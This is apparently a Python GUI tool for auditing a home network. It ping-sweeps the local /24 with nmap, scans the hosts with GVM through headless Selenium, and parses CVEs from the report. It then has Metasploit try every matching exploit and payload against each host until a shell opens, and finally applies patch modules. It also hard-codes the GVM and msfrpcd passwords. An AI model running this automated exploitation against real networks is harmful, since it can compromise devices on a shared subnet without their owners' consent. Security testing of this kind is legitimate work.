from tkinter import *
from tkinter import ttk
from functools import partial
import os
import subprocess
from subprocess import run
import nmap
import time
from selenium import webdriver
import glob
from pymetasploit3.msfrpc import MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole

#5f6cc44a-0e8c-42b8-a655-ee6be55b5950
#5f6cc44a-0e8c-42b8-a655-ee6be55b5950

def main():
    
    root = Tk()
    #root_check(root)
    start_pg(root)
    
    
    
    
def start_pg(root):
    root.geometry("500x500")
    frame= Frame(root)
    frame.pack(expand=True, fill=BOTH)
    
      
    begin_txt = Label(frame,text="Welcome! Click begin to start",width ='100',height='15')
    begin_txt.pack(side =TOP)

    begin_button = Button(frame,text="Begin",width ='50',height='5',bg='green',command=partial(password_pg, root,frame))
    begin_button.pack(side =TOP)
                          
    return(frame)
    mainloop()

#----------Get password
def password_pg(root,frame):
    frame.destroy()

    root.geometry("500x500")
    
    frame= Frame(root)
    frame.pack(expand=True, fill=BOTH)
    
    begin_txt = Label(frame,text="Please enter your password", width ='100',height='15', )
    begin_txt.pack(side =TOP)

    pw_entry = Entry(frame,width = '40',show="*")
    pw_entry.pack(side =TOP)

    button = Button(frame,text="Enter",width ='50',height='2',bg='green',command=partial(password_check, root,frame,pw_entry))
    button.pack(side =TOP)
    
    mainloop()
def password_check(root,frame,pw_entry):
    pw_entry_txt =  str(pw_entry.get())

    
    frame.destroy()
    root.geometry("500x500")
    
    frame= Frame(root)
    frame.pack(expand=True, fill=BOTH)

    p = subprocess.Popen(['sudo', '-S', 'su'], stderr=subprocess.PIPE, stdout=subprocess.PIPE,  stdin=subprocess.PIPE)

    
    out, err = p.communicate(input=(pw_entry_txt+'\n').encode())
    print(err)
    print(pw_entry)
    if not("Sorry" in str(err.decode())):    
        begin_txt = Label(frame,text="Root access enabled",width ='100',height='15')
        begin_txt.pack(side =TOP)
        begin_button = Button(frame,text="Continue",width ='50',height='5',bg='green',command=partial(get_ip_pg, root,frame))
        begin_button.pack(side =TOP)
    else:
        begin_txt = Label(frame,text="Password is incorrect",width ='100',height='15')
        begin_txt.pack(side =TOP)
        begin_button = Button(frame,text="Re-Enter",width ='50',height='5',bg='green',command=partial(password_pg, root,frame))
        begin_button.pack(side =TOP)

    mainloop()
#-----------------------GET Internal IP'S
def get_ip_pg(root,frame):
    frame.destroy()

    output = str(run("ifconfig", capture_output=True).stdout)
    ips = get_internalips(output)
    
    
    root.geometry("500x500")
    
    frame= Frame(root)
    frame.pack(expand=True, fill=BOTH)
    
    heading = Label(frame,text="Below are your internal IP(s)",width ='100',height='5')
    heading.pack(side =TOP)
    for i in ips:
        str1 = ''.join(i)
        Label(frame,text=str1,width ='100',height='1').pack(side =TOP)
        
    begin_button = Button(frame,text="Next",width ='50',height='5',bg='green',command=partial(get_all_ips, root,frame,ips))
    begin_button.pack(side =TOP)

    return(frame) 


    mainloop()
def get_internalips(output):
    
    if "inet " in output.partition("netmask ")[-1]:
        ip = get_internalips(output.partition("netmask ")[-1])
    else:
        ip = []
    
    output = output.partition("netmask")[0]
    output = (output.partition("inet ")[-1]).strip()
    if not("127.0.0" in output):
        ip.append(output)
    return(ip)
    mainloop()
#---------------------------------------------------------------------------------
#----------------------Get all hosts in internal ip


def get_all_ips(root,frame,ips):
    root.geometry("500x500")
    frame.destroy()


    frame= Frame(root)
    frame.pack(expand=True, fill=BOTH)
    heading = Label(frame,text="Now getting the IP's of the devices connected to your network",width ='100',height='5')
    heading.pack(side =TOP)
    root.update_idletasks()

    
    hosts = []
    nm = nmap.PortScanner()
    for i in ips:
        scan_range = nm.scan(hosts=i+"/24",arguments="-n -sn")
        hosts.extend(list(scan_range['scan'].keys()))

    
    heading['text'] = "Below are the IP(s) of the devices on your network"
    
    

    for i in hosts:
        str1 = ''.join(i)
        Label(frame,text=str1,width ='100',height='1').pack(side =TOP)
        
    begin_button = Button(frame,text="Next",width ='50',height='5',bg='green',command=partial(gvm_gui, root,frame,hosts))
    begin_button.pack(side =TOP)

    return(frame)

    mainloop()
#----------------------------------------------------------------------------------------------
#----------GVM-----------------------------

def gvm_gui (root,frame,hosts):
    root.geometry("500x500")
    frame.destroy()





    frame= Frame(root)
    frame.pack(expand=True, fill=BOTH)
    
    heading = Label(frame,text="Launching GVM",width ='100',height='5')
    heading.pack(side =TOP)
    progress_bar = ttk.Progressbar(frame,orient=HORIZONTAL)
    progress_bar.pack(side =TOP)
    progress_bar['value'] = 1
    root.update_idletasks()
    start_gvm()
    
    
    
        
    progress_bar['value'] = 1 +progress_bar['value'] 
    heading['text'] = "Now launching scan"
    root.update_idletasks()
    
    
    option = webdriver.ChromeOptions()
    option.add_argument('headless');
    option.add_argument("--window-size=1920,1080")
    option.add_argument('ignore-certificate-errors')
    prefs = {"download.default_directory":str(os.getcwd())}
    option.add_experimental_option("prefs",prefs)

    driver = webdriver.Chrome(str(os.getcwd())+'/chromedriver',options= option)

    ''''''
    
    #startscan(hosts,driver)
    ''''''
    ''''''
    driver.get('https://127.0.0.1:9392')
    
    found = False
    while found==False:
        try:
            time.sleep(1)
            driver.find_element_by_name("username").send_keys("admin")
            found = True
        except Exception as e:
            print(e)
    
    
    driver.find_element_by_name("password").send_keys("5f6cc44a-0e8c-42b8-a655-ee6be55b5950")
    driver.find_element_by_xpath('//*[@title="Login"]').click()
    time.sleep(2)
    ''''''

    progress_bar['value'] = 5 +progress_bar['value'] 
    heading['text'] = "Scan Started"
    root.update_idletasks()

    done = False
    while done==False:
        driver.get('https://127.0.0.1:9392/tasks')
        time.sleep(60)
        num = progress_bar['value']
        status = get_status(driver)
        if status == 'done':
            done = True
            num = 90
        elif not(status == 'other'):
            num = (status/100)*90  
        progress_bar['value'] = num
        root.update_idletasks()


        driver.get('https://127.0.0.1:9392/reports')

    
    found=False
    while found==False:
        try:
            time.sleep(1)
            driver.find_element_by_xpath('//*[@data-testid="details-link"]').click()
            found = True
        except Exception as e:
            print(e)
        
        

    found = False
    while found==False:
        try:
            time.sleep(1)
            driver.find_element_by_xpath('//*[@title="Download filtered Report"]').click()
            found = True
        except Exception as e:
            print(e)




            
    fileList = glob.glob(str(os.getcwd())+'/report*', recursive=True)
    for filePath in fileList:
        try:
            os.remove(filePath)
        except OSError:
            print("Error while deleting file")



    found = False
    while found==False:
        try:

            
            
            time.sleep(1)
            
            driver.find_elements_by_xpath('//*[@data-testid="select-open-button"]')[1].click()
            time.sleep(2)
            driver.find_elements_by_xpath('//*[@data-testid="select-item"]')[4].click()
            time.sleep(2)
            driver.find_element_by_xpath('//*[@title="OK"]').click()
            time.sleep(5)
            found = True
        except Exception as e:
            print(e)
    
    
        


    report_downloaded = False
    while report_downloaded == False:
        try:
            driver.find_element_by_xpath('//*[@title="OK"]').click()
        except Exception as e:
            print(e)
        time.sleep(5)
        try:
            print("check")
            time.sleep(10)
            r = open(glob.glob(str(os.getcwd())+'/report*', recursive=True)[0], "r")
            report_downloaded = True
        except:
            pass
    
    driver.close()
    progress_bar['value'] = 100
    begin_button = Button(frame,text="Next",width ='50',height='5',bg='green',command=partial(report_process_intermediate, root,frame))
    begin_button.pack(side =TOP)
    
###-Sub-Modules---------------    

def start_gvm():
    subprocess.run(['sudo', 'gvm-stop'])
    subprocess.run(['sudo', 'gvm-start'])

    

def startscan(hosts,driver):
    
    
    driver.get('https://127.0.0.1:9392')
    
    found = False
    while found==False:
        try:
            time.sleep(1)
            driver.find_element_by_name("username").send_keys("admin")
            found = True
        except Exception as e:
            print(e)
    
    
    driver.find_element_by_name("password").send_keys("5f6cc44a-0e8c-42b8-a655-ee6be55b5950")
    driver.find_element_by_xpath('//*[@title="Login"]').click()
    time.sleep(2)

    driver.get('https://127.0.0.1:9392/tasks')
    found = False
    while found==False:
        try:
            time.sleep(1)
            driver.find_element_by_xpath('//*[@title="Move page contents to trashcan"]').click()
        except Exception as e:
            print(e)

        if 'No Tasks available' in driver.page_source:
            found = True
            
    time.sleep(2)

    driver.get('https://127.0.0.1:9392/targets')
    found = False
    while found==False:
        try:
            time.sleep(1)
            driver.find_element_by_xpath('//*[@title="Move page contents to trashcan"]').click()
        except Exception as e:
            print(e)

        if 'No targets available' in driver.page_source:
            found = True


    driver.get('https://127.0.0.1:9392/tasks')
    found = False
    while found==False:
        try:
            time.sleep(1)
            driver.find_elements_by_class_name("gPHCyz")[7].click()
            driver.find_element_by_xpath("//*[contains(text(), 'New Task')]").click()
            found = True
        except Exception as e:
            print(e)
    
    

    
  
    


    driver.find_element_by_xpath('//*[@title="Create a new target"]').click()
    hostsstr = ""
    for i in hosts:
        hostsstr = hostsstr+str(i)+","
    driver.find_element_by_name("hosts").send_keys(hostsstr)
    found = False
    while found==False:
        try:
            time.sleep(1)
            driver.find_elements_by_xpath('//*[@title="Save"]')[1].click()
            found = True
        except Exception as e:
            print(e)
    try:
        time.sleep(2)
        driver.find_elements_by_xpath('//*[@title="Save"]')[1].click()
        time.sleep(2)
        driver.find_elements_by_xpath('//*[@title="Save"]')[1].click()
        time.sleep(2)
        driver.find_elements_by_xpath('//*[@title="Save"]')[1].click()
        time.sleep(2)
        driver.find_elements_by_xpath('//*[@title="Save"]')[1].click()
        time.sleep(2)
        driver.find_elements_by_xpath('//*[@title="Save"]')[1].click()
    except:
        pass
    
    time.sleep(2)
    found = False
    while found==False:
        try:
            time.sleep(1)
            driver.find_element_by_xpath('//*[@title="Save"]').click()
            found = True
        except Exception as e:
            print(e)
    
    time.sleep(2)
    found = False
    while found==False:
        try:
            time.sleep(1)
            driver.find_element_by_xpath('//*[@title="Start"]').click()
            found = True
        except Exception as e:
            print(e)
    
    
    print(driver.find_element_by_xpath('//*[@data-testid="progressbar-box"]').text)
    time.sleep(20)
    print(driver.find_element_by_xpath('//*[@data-testid="progressbar-box"]').text)
    
    
def get_status(driver):
    print(driver.find_element_by_xpath('//*[@data-testid="progressbar-box"]').text)
    if '%' in driver.find_element_by_xpath('//*[@data-testid="progressbar-box"]').text:
        return( int(driver.find_element_by_xpath('//*[@data-testid="progressbar-box"]').text.replace("%", "").strip()))
    elif 'Done' in driver.find_element_by_xpath('//*[@data-testid="progressbar-box"]').text:
        return('done')
    else:
        return('other')


#----------------Report-Process
def report_process_intermediate(root,frame):
    root.geometry("500x500")
    frame.destroy()

    frame= Frame(root)
    frame.pack(expand=True, fill=BOTH)

    heading = Label(frame,text="Report will now be processed",width ='100',height='5')
    heading.pack(side =TOP)
    btn = Button(frame,text="Begin",width ='50',height='5',bg='green',command=partial(report_process, root,frame))
    btn.pack(side =TOP)



def report_process(root,frame):

    root.geometry("1000x1000")
    frame.destroy()
    frame= Frame(root)
    frame.pack(expand=True, fill=BOTH)
    report = open(glob.glob(str(os.getcwd())+'/report*', recursive=True)[0], "r")
    report = report.read()
    report = report.split('Security Issues for Host ')

    
    cve_dict = {}
    report_output = ""
    for host in report[1:]:
        cve_array = []
        Issues = host.split("Issue\n-----") 
        IP = Issues[0].split("\n--------------------------------------")[0].strip()

        report_output = report_output+"For IP: "+str(IP)+"\n"
        report_output = report_output+"--------------------------\n"
        
           
        

        count = 0
        for Indiv_Issue in Issues[1:]:
            count = count+1
            print(Indiv_Issue)
            report_output = report_output+"Issue: "+str(count)+"\n"
            report_output = report_output+str(Indiv_Issue)+"\n"
            report_output = report_output+"___________________________________\n"
            
            

        cves = host.split(' cve: ')
        print("ran")
        for cve in cves[1:]:
            cve = cve.split("\n")[0].strip()
            print(cve)
            cve_array.append(cve)
          
        cve_dict[IP] = cve_array

 
    heading = Label(frame,text="REPORT",width ='100',height='5')
    heading.pack(side =TOP)
    btn = Button(frame,text="Continue",width ='50',height='5',bg='green',command=partial(metasploit, root,frame,cve_dict))
    btn.pack(side =TOP)
    
    scroll = Scrollbar(frame)
    scroll.pack(side=RIGHT, fill=Y)
    text = Text(frame, height = 50, width = 100, yscrollcommand=scroll.set)
    text.insert(END,report_output)
    text.pack(side =TOP)
    scroll.config(command=text.yview)
    
   

    print(cve_dict)

#---------------Metasploit
global global_positive_out
global_positive_out = list()
global global_console_status
global_console_status = False
global outputz
outputz = ""
global total_outputz
total_outputz = ""






def read_console(console_data):
    global global_console_status
    global_console_status = console_data['busy']
    global outputz
    global total_outputz
    if '[+]' in console_data['data']:
        sigdata = console_data['data'].rstrip().split('\n')
        for line in sigdata:
            if '[+]' in line:
                global_positive_out.append(line)
                
    outputz = console_data['data']
    print(outputz)
    total_outputz = total_outputz+outputz



def metasploit(root,frame,cve_dict):

    global outputz
    global previous_outputz
    global total_outputz

    root.geometry("600x600")
    frame.destroy()
    frame= Frame(root)
    frame.pack(expand=True, fill=BOTH)
    heading = Label(frame,text="Now attempting to gain acess into the devices on your network",width ='100',height='5')
    heading.pack(side =TOP)
    root.update_idletasks()
    

    

    subprocess.Popen('msfrpcd -P password -n -f -a 127.0.0.1',shell=True)
    time.sleep(60)
    subprocess.Popen('msfrpcd -P password -n -f -a 127.0.0.1',shell=True)
    time.sleep(60)


    
    client = MsfRpcClient('password',server='127.0.0.1',ssl=True)
    console = MsfRpcConsole(client, cb=read_console)
    time.sleep(5)

    successfully_exploited_cve_dict = {}
    
    for RHOST in cve_dict.keys():
        print("For "+RHOST)
        successfully_exploited_cve = []
        for cve in cve_dict.get(RHOST):
            console.execute('search cve:'+cve )
            time.sleep(5)
            while global_console_status:
                time.sleep(5)

            if not('No results from search' in (outputz)) and not("auxiliary"in (outputz)) :
                console.execute('use 0')
                time.sleep(5)
                while global_console_status:
                    time.sleep(5)

                console.execute('set RHOST '+RHOST)
                time.sleep(5)
                while global_console_status:
                    time.sleep(5)

                console.execute('show options')
                time.sleep(5)
                while global_console_status:
                    time.sleep(5)
                if 'LHOST' in outputz:
                    console.execute('set LHOST 0.0.0.0 ')
                    time.sleep(5)
                    while global_console_status:
                        time.sleep(5)


                console.execute('show payloads')
                time.sleep(5)
                while global_console_status:
                    time.sleep(5)

                

                payload_split = outputz.split("\n")

                
                for i in payload_split[6:-2]:
                    
                    
                    payload_split = i.split('/', 1)                
                    payload_frst = payload_split[0].split(" ")
                    payload_frst = payload_frst[len(payload_frst)-1]

                    payload_last = payload_split[1].split(" ")[0]
                    
                    payload = payload_frst+"/"+payload_last
                
                    


                    console.execute('set payload '+payload)
                    time.sleep(5)
                    while global_console_status:
                        time.sleep(5)

                    console.execute('run')
                    time.sleep(5)
                    in_shell = False
                    
                    while global_console_status and not(in_shell):
                        time.sleep(5)
                        print(total_outputz)
                        if 'opened' in total_outputz and ('Command shell session' in total_outputz or 'Meterpreter session'in total_outputz): #or (not('Exploit completed, but no session was created') in outputz and not('Started bind TCP handler') in outputz and not('Command Stager progress') in outputz) :
                            in_shell = True
                            time.sleep(5)
                            client = MsfRpcClient('password',server='127.0.0.1',ssl=True)
                            console = MsfRpcConsole(client, cb=read_console)
                            successfully_exploited_cve.append(cve)
                            print(successfully_exploited_cve)
                            total_outputz = ""
                            print("---------------CLEARED------------------------------------------------------------")
                        

                    if in_shell:
                        break
                        #continue
    
                    
        print(successfully_exploited_cve)
        
        successfully_exploited_cve_dict[RHOST] = successfully_exploited_cve

        
    print(successfully_exploited_cve_dict)
            
    


    print("------------------------------------------------------------")
    root.geometry("1000x1000")

    cve_exploited = ""

    for IP in successfully_exploited_cve_dict.keys():
        cve_exploited = cve_exploited+"---------------------------------------------------------------\n"
        cve_exploited = cve_exploited+IP+"\n"
        cve_exploited = cve_exploited+"---------------------------------------------------------------\n"
        for cve in successfully_exploited_cve_dict.get(IP):
            cve_exploited = cve_exploited+cve+"\n"


    heading = Label(frame,text="From the CVE's from the report shown previously, the following were exploited succesfully",width ='100',height='5')
    heading.pack(side =TOP)
    button = Button(frame,text="Continue",width ='50',height='2',bg='green',command=partial(intermediate_patch_screen, root,frame,cve_dict))
    button.pack(side =TOP)
    scroll = Scrollbar(frame)
    scroll.pack(side=RIGHT, fill=Y)
    text = Text(frame, height = 50, width = 100, yscrollcommand=scroll.set)
    text.insert(END,cve_exploited)
    text.pack(side =TOP)
    scroll.config(command=text.yview)
   

#-------------------------------------------------------------------------------------
def intermediate_patch_screen(root,frame,cve_dict):
    frame.destroy()

    root.geometry("900x900")
    
    frame= Frame(root)
    frame.pack(expand=True, fill=BOTH)
    txt = Label(frame,text="The system will not check for patches to any vulnerabilities detected please do not close this window while exploit fixes show", width ='100',height='30' )
    txt.pack(side =TOP)
    button = Button(frame,text="Continue",width ='50',height='2',bg='green',command=partial(fix_exploits, root,frame,cve_dict))
    button.pack(side =TOP)
    root.update_idletasks()
    
def fix_exploits(root,frame,cve_dict):
    frame.destroy()
    root.geometry("700x700")
    
    
    import os
    import sys
    for host in cve_dict.keys():
        for Vulnerability in cve_dict.get(host):
            found = False
            try:
                sys.path.insert(0, str(os.getcwd())+'/Patches')
                imported_module = __import__(str(Vulnerability))
                found = True
            except Exception as e:
                print(e)
            if found== True:
                root.destroy()
                imported_module.start(host)
                
                root = Tk()
                root.geometry("500x500")
                frame= Frame(root)
                frame.pack(expand=True, fill=BOTH)
                txt = Label(frame,text="Searching for more patches", width ='100',height='30' )
                txt.pack(side =TOP)
                root.update_idletasks()
        
                
    frame.destroy()
    frame= Frame(root)
    frame.pack(expand=True, fill=BOTH)
    txt = Label(frame,text="Program has finished. Please remember to restart the devices that have been patched.", width ='100',height='30' )
    txt.pack(side =TOP)
    button = Button(frame,text="Exit",width ='50',height='2',bg='green',command=exit)
    button.pack(side =TOP)
    root.update_idletasks()

    
main()



